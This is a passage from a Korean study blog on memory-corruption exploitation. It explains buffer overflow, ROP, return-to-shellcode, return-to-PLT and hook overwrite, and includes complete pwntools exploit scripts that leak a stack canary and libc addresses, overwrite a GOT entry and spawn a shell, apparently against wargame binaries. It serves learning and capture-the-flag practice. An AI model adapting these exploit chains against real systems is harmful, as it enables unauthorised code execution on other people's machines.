</code></pre></li></ul><h3 id=buffer-overflow>buffer overflow<a hidden class=anchor aria-hidden=true href=#buffer-overflow>#</a></h3><ul><li>프로그램에 입력을 위해 지정된 버퍼를 초과하여 입력값을 집어넣어 버퍼 다음에 할당된 메모리의 값을 덮어쓰는 행위</li><li><code>scanf("%s",buf)</code>는 입력값의 갯수 제한이 없기 때문에 buffer overflow에 취약하므로 절대 사용하면 안되는 형태 중 하나이다.<ul><li>scanf와 유사하게 strcpy, strcat, sprintf 도 길이에 제약이 없는 함수로, 대신 strncpy, strncat, snprintf, fgets, memcpy 를 사용하는것이 권장된다.</li></ul></li><li>C 계열 언어에서 문자열(string)을 처리할 때 문자열의 종결을 null(&rsquo;\0&rsquo;) 문자로 판단하는데, 문자열 끝에 null이 존재하지 않는 경우 문자열보다 더 뒷편의 주소를 참조하게 될 수 있고, 이를 OOB(out of boundary) 취약점이라 한다.</li></ul><h3 id=ropreturn-oriented-programming>ROP(Return Oriented Programming)<a hidden class=anchor aria-hidden=true href=#ropreturn-oriented-programming>#</a></h3><ul><li>gadget 이란 어셈블리어에서 ret 명령어 앞에 오는 코드 조각으로, 코드의 실행을 제어한다.</li><li>gadget 을 사용하여 함수의 호출 혹은 인자를 조작하는 공격 방식을 ROP라 한다.</li><li>payload를 return gadget(리턴 가젯) 으로 채워지기에 <code>ROP chain</code> 이라고도 한다.</li></ul><h4 id=return-to-shellcode>Return to Shellcode<a hidden class=anchor aria-hidden=true href=#return-to-shellcode>#</a></h4><ul><li>buffer overflow를 통해 버퍼에 shell 함수 실행 코드를 삽입하고 STL 에서 return 주소를 해당 버퍼의 주소로 치환하여 shell code를 실행하는 해킹 기법</li><li><a href=https://dreamhack.io/wargame/challenges/352>문제</a> 풀이 예시<pre tabindex=0><code>from pwn import *

def slog(n, m): return success(&#39;: &#39;.join([n, hex(m)]))

p = process(&#39;./r2s&#39;)
#p = remote(&#34;host3.dreamhack.games&#34;, &#34;11171&#34;)

context.arch = &#39;amd64&#39;

# [1] Get information about buf
p.recvuntil(b&#39;Address of the buf: &#39;)
buf = int(p.recvline()[:-1], 16) # remote &#39;\n&#39;
slog(&#39;Address of buf&#39;, buf)

p.recvuntil(b&#39;buf and $rbp: &#39;)
buf2sfp = int(p.recvline().split()[0]) # another way to remove &#39;\n&#39;
buffer_to_canary = buf2sfp - 8 # canary is in rbp+8, so buf + buffer_to_canary - 8 is address of canary
slog(&#39;buf &lt;=&gt; sfp&#39;, buf2sfp)
slog(&#39;buf &lt;=&gt; canary&#39;, buffer_to_canary)

# [2] Leak canary value
payload = b&#39;A&#39;*(buffer_to_canary + 1) # (+1) because of the first null-byte

p.sendafter(b&#39;Input:&#39;, payload)
p.recvuntil(payload)
canary = b&#39;\x00&#39;+p.recvn(7)
slog(&#39;Canary&#39;, u64(canary))

# [3] Exploit
shell_code = asm(shellcraft.sh())
print(&#39;Length of Shell Code:&#39; , len(shell_code))
payload = shell_code.ljust(buffer_to_canary, b&#39;A&#39;) + canary + b&#39;B&#39; * 0x8 + p64(buf)
# 버퍼에 쉘 코드를 넣고, 남는 공백은 아무 문자로 메꾼다. 그 후 카나리를 잘 덮고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
# gets() receives input until &#39;\n&#39; is received
p.sendlineafter(b&#39;Input:&#39;, payload)                                                                                                                                                                              
p.interactive()
</code></pre></li></ul><h4 id=rtl-return-to-library>RTL (Return To Library)<a hidden class=anchor aria-hidden=true href=#rtl-return-to-library>#</a></h4><ul><li>NX를 통해 특정 버퍼의 실행을 막자 library의 코드를 실행시켜서 쉘 권한을 얻는 방식의 해킹 기법</li><li>리눅스의 <code>libc</code> 라이브러리의 <code>system</code>, <code>execve</code> 함수를 실행시키는 것이 대표적이다.</li></ul><h4 id=return-to-plt>Return to PLT<a hidden class=anchor aria-hidden=true href=#return-to-plt>#</a></h4><ul><li>ASLR 기법이 적용되어도 PLT의 주소는 고정되어 있음을 이용한 공격 방법 으로, PIE 기법을 적용하면 Return to PLT 공격을 예방할 수 있다.</li><li>system 함수가 호출되고, canary가 유출되는 코드라면 아래 절차로 쉘을 실행시킬 수 있다.<ol><li><code>system()</code> 이 호출 될 때 rdi 를 반환하는 위치를 찾는다. rdi 값을 &ldquo;/bin/sh"로 설정하게 된다면 system("/bin/sh&rdquo;), 즉 쉘을 실행하게 되는 것이다.</li></ol><ul><li>ROPgadget 을 사용하여 <code>pop rdi</code> 구문의 주소를 찾는다. (여러 개 있다면 이중 system() 함수의 위치를 특정해야 한다.)</li><li><code>ROPgadget --binary BINARY_FILE_PATH --re pop rdi</code> 를 입력하면 BINARY_FILE_PATH 경로의 바이너리에서 &lsquo;pop rdi&rsquo; 구문이 들어있는 gadget들을 출력한다.</li></ul><ol start=2><li><code>/bin/sh</code> 문자열이 저장된 주소를 확인한다.</li></ol><ul><li>gdb로 바이너리를 실행시킨 후 <code>search /bin/sh</code> 명령으로 확인 가능하다.</li></ul><ol start=3><li><code>system</code> 함수의 PLT 주소를 확인한다.</li></ol><ul><li>gdb로 바이너리를 실행시킨 후 <code>plt</code> 명령으로 <code>system@plt</code> 값의 주소를 확인한다. (<code>info func system@plt</code> 명령도 가능)</li></ul><ol start=4><li>리턴 가젯의 주소를 확인한다.</li></ol><ul><li><code>ROPgadget --binary BINARY_FILE_PATH --re ret</code> 명령중 ret 가 단독으로 있는 라인(리턴 가젯)의 주소를 확인한다.</li><li><code>system()</code> 함수는 내부에서 movaps 함수를 사용하는데, x64 환경에서 이 함수는 스택에서 값을 읽어올 때 16바이트로 정렬되는지 확인하고, 16바이트로 묶어지지 않는다면 exception을 발생시켜 segment fault을 유발한다.</li><li>이를 &lsquo;리턴 가젯&rsquo;을 스택에 집어넣어 8바이트를 추가하여 16바이트를 맞춘다.<ul><li>exploit을 활용해 A 주소번지를 스택프레임에 return code 영역에 넣으려 할 때, 아래와 같이 return code 자리에 직접 A 주소를 집어넣어도 되지만,<pre tabindex=0><code>canary
---------- rbp
SFP
---------- rbp + 0x8
return code   &lt;-- A 주소 주입
---------- rbp + 0x10
</code></pre></li><li>아래 그림과 같이 return code 자리에 리턴 가젯을 주입해도 된다.<pre tabindex=0><code>canary
---------- rbp
SFP
---------- rbp + 0x8
return code &lt;-- 리턴 가젯 주입  
---------- rbp + 0x10
???????     &lt;-- A 주소 주입
</code></pre></li><li>리턴가젯 <code>ret</code> 는 <code>pop rip; jmp rip</code> 와 같은 효과이고, 이는 결국 rbp + 0x10 위치에 있는 A 주소를 실행하게 되어 첫번째 코드와 동작성은 같다.</li><li>다만, return code 자리보다 8byte 아래쪽 주소를 사용하게 된다.</li></ul></li><li><a href=https://ropemporium.com/guide.html>MOVAPS 관련 참조 페이지</a></li></ul><ol start=5><li>buffer overflow를 활용해 <code>canary</code>를 복구하고, SFP를 아무 값으로 채운다.</li><li><code>return code</code> 리턴 가젯으로 채워 rbp+0x10의 주소에 있는 코드가 실행되도록 한다. (system 함수의 movaps 에 대응하기 위함)</li><li>rbp + 0x10 주소를 <code>pop rdi</code> 가젯으로 채우고, (2)에서 찾은 <code>/bin/sh</code> 주소를 집어넣고, (3) 에서 찾은 <code>system</code> 함수의 plt 주소를 그 다음에 집어넣는다.</li></ol><ul><li>여기까지 수행하면 스택은 다음과 같다.</li></ul><pre tabindex=0><code>   canary
   ---------- rbp
   SFP   &lt;-- 랜덤값 주입
   ---------- rbp + 0x8
   return code &lt;-- 리턴 가젯 주입  
   ---------- rbp + 0x10
   ???????     &lt;-- pop rdi 가젯 주입
   ---------- rbp + 0x18
   ???????     &lt;-- &#34;/bin/sh&#34; string 주소 주입
   ---------- rbp + 0x20
   ???????     &lt;-- system() 함수 plt 주소 주입
   ```
</code></pre></li></ul><h4 id=return-oriented-programming>Return Oriented Programming<a hidden class=anchor aria-hidden=true href=#return-oriented-programming>#</a></h4><ul><li>앞서 살펴본 <code>Return to ~</code> 공격은 일부 방어 기법이 빠져있을 때 사용할 수 있었다.</li><li>카나리, NX, ASLR이 모두 적용되어 있어도, 프로그램에 buffer overflow 취약점을 통해 exploit 을 수행하는 방법을 알아본다.</li><li><code>NX</code> 보호기법 때문에 코드를 직접 버퍼에 작성하고 실행시킬수 없기에 &ldquo;Return To Library&rdquo; 에서처럼 라이브러리의 <code>system</code> 함수와 <code>"/bin/sh"</code> 문자열을 사용하여 <code>system("/bin/sh")</code> 를 동작시키는 것을 최종 목표로 한다.</li></ul><ol><li><p>stack canary 주소 확인</p><ul><li><code>printf</code>, <code>write</code>, <code>puts</code> 등 버퍼를 출력하는 함수의 버퍼를 overflow 시켜 rbp-0x08 에 위치한 canary를 확인한다.<ul><li><a href=../../assembly/assembly_basic/#%EC%8A%A4%ED%83%9D%ED%94%84%EB%A0%88%EC%9E%84>stack 참조</a></li></ul></li></ul></li><li><p>system() 함수 주소 확인</p><ul><li><code>libc.so.6</code> 에 정의된 <code>system</code> 함수의 위치를 확인하기 위해 같은 라이브러리에 포함된 <code>read</code>, <code>puts</code>, <code>printf</code> 등의 함수가 호출되어 <code>GOT</code> 에 저장되었는지 확인한다.</li><li>라이브러리의 함수가 하나라도 호출되었다면, 라이브러리 파일 전체가 로드 되기 때문에 <code>syetem</code> 함수도 메모리에 적재 됨이 보장된다.</li><li><a href=../../computerscience/computer_science/#plt--got>PLT/GOT 참조</a></li><li>ASLR을 통해 라이브러리 파일의 적재 위치를 랜덤화 시켰지만, 라이브러리 파일 내부의 함수 위치는 랜덤화 시키지 못한다.</li><li>즉, <code>libc</code> 라이브러리 버전이 같다면 실행된 프로그램의 메모리 상에 로딩된 <code>puts</code> 함수의 주소와 <code>system</code> 함수의 주소상 거리는 항상 일치한다는 것이다.</li><li>이 점을 이용하여 (1) <strong>libc 라이브러리의 시작 주소(libc_base)</strong> 와 (2) <strong>system 함수의 offset</strong> 을 알 수 있다면 system 함수의 호출이 가능하다.</li></ul><ol><li><p>libc 라이브러리의 시작 주소(libc_base) 확인</p><ul><li>got에 로드 된 libc 함수의 주소와 해당 함수의 offset 을 빼면 libc_base 주소를 획득할 수 있다.<ul><li>libc_base 는 마지막 바이트가 항상 00 으로 끝나는 특징이 있다.</li></ul></li></ul><ol><li><p>linux 명령어 + gdb 사용</p><ul><li>리눅스 쉘에서 <code>ldd /bin/bash</code> 명령을 사용하여 libc 의 경로를 확인한다.<ul><li>ex)<pre tabindex=0><code>linux-vdso.so.1 (0x00007ffff8cd0000)
libtinfo.so.6 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f0d65a90000)
libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0d65a80000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d65880000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0d65c01000)
</code></pre></li><li>혹은 <code>getconf -a | grep libc</code> 명령어로도 libc 버전을 확인할 수 있다.</li></ul></li><li>확인된 libc 파일 경로를 <code>readelf</code> 명령어로 분석하여 내부 함수들의 주소를 확인한다.<ul><li><code>readelf -s /lib/x86_64-linux-gnu/libc.so.6</code><pre tabindex=0><code>92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
</code></pre></li><li>ELF 상 system 함수의 offset이 0x0000000000052290 임을 알수 있다.</li></ul></li><li><code>gdb</code> 실행 후 <code>p system</code> 으로 got 에 저장된 system 함수의 주소를 확인할 수 있다.<ul><li>ex)<pre tabindex=0><code># p system
$1 = {int (const char *)} 0x7ffff7e1d290 &lt;__libc_system&gt;
# p puts
$2 = {int (const char *)} 0x7ffff7e4f420 &lt;__GI__IO_puts&gt;
</code></pre></li></ul></li><li>got 상 주소에서 offset을 빼면 libc_base 주소를 구할 수 있다.<ul><li>system 함수: 0x7ffff7e1d290 - 0x0000000000052290 = 0x7FFFF7DCB000</li><li>puts 함수: 0x7ffff7e4f420 - 0x0000000000084420 = 0x7FFFF7DCB000</li><li>libc_base의 주소가 0x7FFFF7DCB000 이며, 어떤 함수를 사용해도 계산 결과가 같은 것을 볼 수 있다.</li></ul></li></ul></li><li><p>pwntool 사용</p><ul><li><p>libc 라이브러리의 ELF를 확인한다.</p><pre tabindex=0><code>from pwn import *

libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
offset_read = libc.symbols[&#39;read&#39;]
</code></pre></li><li><p>이제 read 함수의 주소를 확인해야 한다. 하지만 pwntool에서는 read 함수의 주소가 저장된 got 테이블의 주소는 확인할 수 있지만, 그 안에 저장된 값(read 함수의 메모리상 주소)은 확인할 수 없다.</p></li><li><p>read 함수의 메모리상 주소값을 확인하려면 프로그램에서 got 값을 출력하도록 exploit code를 작성해야 한다.</p></li><li><p>buffer overflow를 통해 <code>write(1,read_got)</code> 를 호출하면 원하는 값을 출력할 수 있다.</p></li><li><p>rdi(첫번째 인자)를 1, rsi(두번째 인자)를 read_got로 설정하기 위해 <code>return gadget</code> 을 사용한다.</p></li><li><p><code>ROPgadget --binary PROGRAM_PATH</code> 로 검색 하여 <code>pop rsi</code> 와 <code>pop rdi</code> gadget 을 찾는다.</p><ul><li><a href=../../systemhacking/pwntool/#ropgadget>ROPgadget 사용법 참조</a></li></ul><pre tabindex=0><code>0x0000000000400851 : pop rsi ; pop r15 ; ret
0x0000000000400853 : pop rdi ; ret
# 검색 결과 pop rdi / pop rsi 구문이 포함된 다른 gadget 이 없으므로 선택지는 없다.
# gadget 의 주소는 동일한 프로그램 실행시 항상 일정한 값을 가지므로 미리 추출하여 사용할 수 있다.
</code></pre></li><li><p>exploit 코드를 작성한다.</p><pre tabindex=0><code>from pwn import *

p = process(PROGRAMA_PATH)
e = ELF(PROGRAMA_PATH)

# exploit code, 코드상 buffer overflow를 발생시킬 수 있는 구문이 있다고 가정한다.
read_plt = e.plt[&#39;read&#39;]  # read 함수의 plt
read_got = e.got[&#39;read&#39;]  # read 함수의 got
write_plt = e.plt[&#39;write&#39;]  # write 함수의 plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret 구문의 주소
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret 구문의 주소

payload = b&#39;A&#39;*(buffer_length + 8) + canary + b&#39;B&#39;*8  # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi 에 1 을 적용하도록 gadget 배치
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.
payload += p64(write_plt)  # return 주소를 write_plt 로 변경한다. 
# write(1,read_got) 가 완성되었다. 결과로 read 함수의 주소를 출력한다.
</code></pre></li><li><p>출력된 값에서 read 함수의 offset (앞서 구한 offset_read) 을 빼면 libc_base 를 구할 수 있다.</p></li></ul></li></ol></li><li><p>system 함수의 offset 확인</p><ol><li>linux 명령어 사용<ul><li><code>readelf -s /lib/x86_64-linux-gnu/libc.so.6</code><pre tabindex=0><code>92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
</code></pre></li><li>system 함수의 offset은 <code>0x0000000000052290</code></li></ul></li><li>pwntool 사용<ul><li>ELF 함수로 ELF 파일을 읽고 필요한 함수의 symbol을 참조한다.<pre tabindex=0><code>libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
offset_system = libc.symbols[&#39;system&#39;]
print(offset_system)
</code></pre></li></ul></li></ol></li></ol><ul><li>1,2에서 나온 결과를 종합하여, libc_base 에 system 함수의 offset을 더한 결과가 &ldquo;실행된 프로그램의 메모리에 적재된 system 함수의 주소&rdquo; 값이다.</li><li>libc 의 일부 함수의 주소를 입력하면 libc 버전 및 다른 함수의 주소도 확인할 수 있는 사이트가 있다.<ul><li><a href=https://libc.rip/>사이트 링크</a></li></ul></li></ul></li><li><p>&ldquo;/bin/sh&rdquo; 문자열의 위치를 찾는다. (생략 가능)</p><ul><li>&ldquo;/bin/sh&rdquo; 문자열을 lib.so.6 파일에서 찾을 수 있지만, writing 가능한 버퍼에 직접 문자열을 입력하는 방법도 있다. 후자의 경우 굳이 &ldquo;/bin/sh&rdquo; 를 찾을 필요가 없다.</li><li>libc.so.6 에 포함된 &ldquo;/bin/sh&rdquo; 문자열의 주소를 찾으려면, system() 함수의 주소를 찾을 때와 마찬가지로 <code>/bin/sh</code> 문자열의 offset 에 libc_base 주소를 더하여 참조할 수 있다.</li></ul><ol><li><p>gdb 사용</p><ul><li><code>gdb</code> 를 사용하면 offset이 아닌 실제 주소를 확인할 수 있다. <code>search /bin/sh</code> 명령으로 /bin/sh 의 &ldquo;메모리상 주소&rdquo; 가 출력된다.<ul><li>ex)<pre tabindex=0><code>pwndbg&gt; search /bin/sh
Searching for value: &#39;/bin/sh&#39;
libc-2.31.so    0x7ffff7f7f5bd 0x68732f6e69622f /* &#39;/bin/sh&#39; */

# /bin/sh 의 주소(0x7ffff7f7f5bd) 에서 libc_base 를 뺀 값이 /bin/sh 의 offset이 된다.
</code></pre></li></ul></li></ul></li><li><p>linux 명령어 사용</p><ul><li>linux의 <code>strings</code> 명령을 이용한다.</li><li><code>strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh</code> 명령 결과 <code>1b45bd /bin/sh</code> 가 확인된다.</li></ul></li><li><p>pwntool 사용</p></li></ol><ul><li>ELF 파일을 분석하여 나온 결과에 libc_base 를 더하면 실제 메모리 주소가 나온다.</li><li>ex)<pre tabindex=0><code>from pwn import *
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

# /bin/sh offset 확인
bin_sh1 = list(libc.search(b&#39;/bin/sh&#39;))[0]  # 방법1
bin_sh2 = next(libc.search(b&#39;/bin/sh&#39;))  # 방법2
# -&gt; /bin/sh/ 의 메모리상 주소 == libc_base + bin_sh1 이다.
</code></pre></li></ul></li><li><p>system("/bin/bash") 를 작성한다.</p><ul><li>read 함수의 got 에 system 함수의 주소를 넣으면, 코드상 read("/bin/bash") 가 실제로는 system("/bin/bash") 로 동작하게 된다.</li><li>이를 이용해 got 영역을 조작하여 system 함수를 호출한다.</li></ul><ol><li>pwntool 사용<ul><li>리눅스에서 <code>ROPgadget --binary rop</code> 명령으로 바이너리를 분석하면, return gadget 들이 확인된다. 이중 rdi, rsi 가 포함된 gadget들을 확인한다. (이하 rdi_ret, rsi_ret)</li><li>rdi_ret, rsi_ret 을 활용하여 rdi() 와 rsi 값을 알맞게 설정 해 주고, 원하는 함수를 호출한다..</li><li>gadget들은 특정 함수를 호출하는 것이 아니기 때문에 동일한 stack frame 안에서 호출되므로 canary 를 세팅 해 줄 필요는 없다.</li><li>코드상으로는 다음과 같다.<pre tabindex=0><code># (2) 에서 libc_base 를 알아내기 위해 buffer overflow 로 read 함수의 got 영역을 출력하도록 payload를 작성했다.
# 여기에 system(&#34;/bin/sh&#34;) 를 호출하기 위한 코드를 이어서 작성한다.
# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.
# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.
# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.
payload += p64(pop_rdi_ret) + p64(0)  # rdi 에 0 값 적용
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용
# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.
# e = ELF(PROGRAM_PATH)
# read_plt = e.plt[&#39;read&#39;]
payload += p64(read_plt)  # read 함수 호출

# read의 got를 system으로 변경하게 되면, read(&#34;/bin/bash&#34;) 를 호출한 결과는 system(&#34;/bin/bash&#34;) 가 된다.  
payload += p64(pop_rdi_ret) + p64(addr_bin_sh)
payload += p64(read_plt)
</code></pre></li></ul></li></ol></li></ol><ul><li>정리하자면 아래와 같다.<ul><li>전제조건 :<ul><li><ol><li>buffer overflow 2회 이상</li></ol></li><li><ol start=2><li>바이너리 보유</li></ol></li></ul></li><li>순서:<ul><li><ol><li>canary 획득</li></ol></li><li><ol start=2><li>exploit 용 payload 작성</li></ol><ul><li>바이너리를 <code>ROPgadget --binary rop</code> 로 분석하여 return gadget 추출</li><li><code>write(1, read_got, ?)</code> 함수를 return gadget 으로 작성하여 read 함수(다른 함수도 가능) 의 got 주소 출력 유도</li><li><code>read(0, read_got, ?)</code> 함수를 return gadget 으로 작성하여 read 함수의 got 영역 값 덮어쓰도록 하기<ul><li><code>read(read_got + 8)</code> 함수를 호출. read 함수의 got 를 system 함수의 주소로 변경하고, <code>read_got + 8</code> 에 <code>"/bin/sh"</code> 를 넣을 예정이기 때문에, 이 구문은 <code>system("/bin/sh")</code> 가 될 예정</li></ul></li></ul></li><li><ol start=3><li>payload를 프로그램에 전달하여 출력된 read 함수의 주소를 획득, 획득한 주소에서 read 함수의 offset 을 빼서 libc_base 계산</li></ol></li><li><ol start=4><li>libc_base 에 system 함수의 offset 을 더해서 system 함수의 주소 계산</li></ol></li><li><ol start=5><li>system 함수의 주소(8byte) + &ldquo;/bin/sh&rdquo;(8byte) 의 payload 를 작성하여 프로그램에 전달</li></ol><ul><li>앞서 작성한 <code>read(0, read_got, ?)</code> 함수에서 이를 수신함</li></ul></li><li>그 결과 프로그램에서 <code>read(read_got + 8)</code> 는 <code>system("/bin/sh")</code> 로 변경되고, 쉘 권한을 획득하게 됨</li></ul></li></ul></li><li>전체 코드는 다음과 같다.</li></ul><pre tabindex=0><code>from pwn import *

##########
# RUN PROGRAM
##########
p = process(PROGRAM_PATH)
e = ELF(PROGRAM_PATH)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

# 특정 libc 파일을 적용하고 싶을 때
# p = process(&#39;PROGRAM_PATH&#39;, env= {&#34;LD_PRELOAD&#34; : &#34;./libc.so.6&#34;})
# libc = ELF(&#39;./libc.so.6&#39;)

buffer_length = 0x30  # exploit 할 코드에 따라 변경 필요

##########
# LEAK CANARY
##########
payload = b&#39;A&#39;*(buffer_length + 8 + 1) # overwrite buffer_length + 8(other local variable) + 1(canary_first 1 byte null)
# p.sendafter(b&#39;Buf: &#39;, payload)
p.send(payload)
p.recvuntil(payload)
canary = b&#39;\x00&#39; + p.recvn(7)
print(&#39;canary:&#39;,hex(u64(canary)))

##########
# LEAK ADDRESS OF LIBC FUNC
##########
read_got = e.got[&#39;read&#39;]  # read 함수의 got
read_plt = e.plt[&#39;read&#39;]  # read 함수의 plt
write_plt = e.plt[&#39;write&#39;]  # write 함수의 plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret 구문의 주소
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret 구문의 주소
ret = 0x0000000000400596  # ret 구문의 주소, 리턴 가젯

payload = b&#39;A&#39;*(buffer_length + 8) + canary + b&#39;B&#39;*8  # overwrite buffer_length + 8(other local variable) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi 에 1 을 적용하도록 gadget 배치
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.
payload += p64(write_plt)  # return 주소를 write_plt 로 변경한다.
# write(1,read_got) 가 완성되었다. payload를 프로그램에 넘기면 read 함수의 주소를 출력하게 된다.

##########
# CHANGE GOT OF READ INTO ADDR OF SYSTEM
##########
# 앞서 libc_base를 알아내기 위해 buffer overflow로 read 함수의 got 영역을 출력하도록 payload를 작성했다.
# payload에 system(&#34;/bin/sh&#34;) 를 호출하기 위한 코드를 이어서 작성한다.
# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.
# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.
# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.
payload += p64(pop_rdi_ret) + p64(0)  # rdi 에 0 값 적용
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용
# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.
payload += p64(read_plt)  # read 함수 호출

# 참조
offset_bin_sh = next(libc.search(b&#39;/bin/sh&#39;))  # libc에 위치한 &#34;/bin/sh&#34; 문자열의 위치를 추출할 수 있다.
print(&#39;offset /bin/sh:&#39;, hex(offset_bin_sh))

##########
# CALL read(&#34;/bin/bash&#34;)
##########
# read의 got를 system으로 변경하게 되면, read(&#34;/bin/bash&#34;) 를 호출한 결과는 system(&#34;/bin/bash&#34;) 가 된다.
payload += p64(pop_rdi_ret) + p64(read_got + 0x08)  # &#34;/bin/bash&#34; 문자열을 libc에서 사용하지 않고 got 영역에 덮어써서 사용하겠다.
payload += p64(ret)  # system() 함수 내부의 movaps 가 스택의 데이터를 16바이트로 정렬하므로, 16바이트 짝을 맞추기 위해 리턴가젯 사용
payload += p64(read_plt)


# payload 보내게 되면 (1) read 함수 주소 출력, (2) stdin 입력 대기, 입력된 값으로 read_got 덮어씀, (3) system(&#39;/bin/sh&#39;) 실행
p.sendafter(b&#39;Buf: &#39;, payload)
addr_read = p.recvn(6).ljust(8,b&#39;\x00&#39;)  # ASLR이 적용되면 라이브러리 함수의 주소는 항상 0x00007f 로 시작하므로 0x00 0x00 + 6자리로 구성된다.
print(&#39;addr read:&#39;, hex(u64(addr_read)))

##########
# CALC LIBC_BASE ADDR
##########
# 유출된 read 함수의 주소로 libc_base 가 메모리상에 위치하는 주소를 계산한다.
offset_read = libc.symbols[&#39;read&#39;]
libc_base = u64(addr_read) - offset_read
print(&#39;libc_base:&#39;, hex(libc_base))

##########
# CALC ADDR OF SYSTEM
##########
offset_system = libc.symbols[&#39;system&#39;]
addr_system = libc_base + offset_system
print(&#39;addr system:&#39;, hex(addr_system))

p.send(p64(addr_system) + b&#34;/bin/sh\x00&#34;)

p.interactive()
</code></pre><h3 id=hook-overwrite>Hook Overwrite<a hidden class=anchor aria-hidden=true href=#hook-overwrite>#</a></h3><ul><li>Hooking 이란 운영 체제가 특정 코드를 실행하려 할 때 다른 코드가 강제로 실행되도록 하는 기능이며, 이때 실행되는 코드를 <code>Hook</code> 이라 한다.</li><li>시스템 상 정의되어 있는 Hook 을 원하는 형태로 덮어써서 수행하는 공격을 <code>Hook Overwrite</code> 라 한다.</li><li>libc.so 파일의 malloc 관련 함수들에 디버깅 편의를 위해 hook 이 미리 설정되어 있다.<ul><li><code>__libc_malloc</code> 함수를 살펴보면 <code>__malloc_hook</code> 함수가 있으면 이를 호출하도록 되어 있다.</li><li>free 함수와 realloc 함수들도 각각 <code>__free_hook</code>, <code>__realloc_hook</code> 함수가 hooking 되어있다.</li><li><code>__malloc_hook</code> 는 <code>libc.so</code> 영역 안에 있으므로 writing 권한이 있는 라이브러리 영역이며, <code>__malloc_hook</code> 에 <code>Hook Overwrite</code> 공격을 수행하면 Full RELRO 기법으로 방어할 수 없다.</li><li><code>readelf -s</code> 명령으로 libc.so 파일의 section 정보를 추출하고, <code>__malloc_hook</code> 함수의 index를 찾는다. 이후 <code>readelf -S</code> 혹은 <code>objdump -h</code> 명령으로 libc.so 파일의 section 들을 확인하여 해당 메모리 영역에 읽기/쓰기 권한이 있는지 확인 할 수 있다.<ul><li><code>__malloc_hook</code>, <code>__free_hook</code>, <code>__realloc_hook</code> 가 저장되는 영역이 bss 영역인 linux 버전에서는 Hook Overwrite가 가능하다.</li><li><code>__free_hook</code> 이나 <code>__malloc_hook</code> 은 보안 및 성능 때문에 glibc 2.34 버전부터 제거되었다.</li></ul></li></ul></li></ul><h4 id=free-hook-overload>Free Hook Overload<a hidden class=anchor aria-hidden=true href=#free-hook-overload>#</a></h4><ul><li><code>free</code> 함수에 적용된 <code>__free_hook</code> 를 덮어써서 exploit을 수행 해 본다.</li></ul><ol><li><p>libc_base 주소 확인</p><ul><li>main 함수는 보통 <code>__libc_start_main</code> 함수에서 호출되고, <code>__libc_start_main</code> 함수의 메모리 주소는 <code>libc_base</code> 이다.</li><li>main 함수의 스택 프레임을 확인하여 return address 를 추출한다. return address 는 __libc_start_main 함수의 어딘가를 가리킬 것이다.<ul><li><code>gdb</code> 로 exploit 대상 프로그램을 로딩하고, <code>main</code> 함수에 break point 를 걸고, run 명령으로 프로그램을 실행시킨다. pwndbg 플러그인이 설치된 gdb라면 <code>bt</code> 명령으로 stack 상 <code>main</code> 함수의 return address 가 확인된다.</li><li>이 return address 를 <code>x &lt;주소></code> 명령으로 확인하면 <code>__libc_start_main</code> + α (임의의 값) 으로 표시된 것을 확인 할 수 있다.</li></ul></li><li><code>readelf -s</code> 명령으로 libc 라이브러리에서 <code>__libc_start_main</code> 함수의 offset 을 확인한다.</li><li>위에서 얻어낸 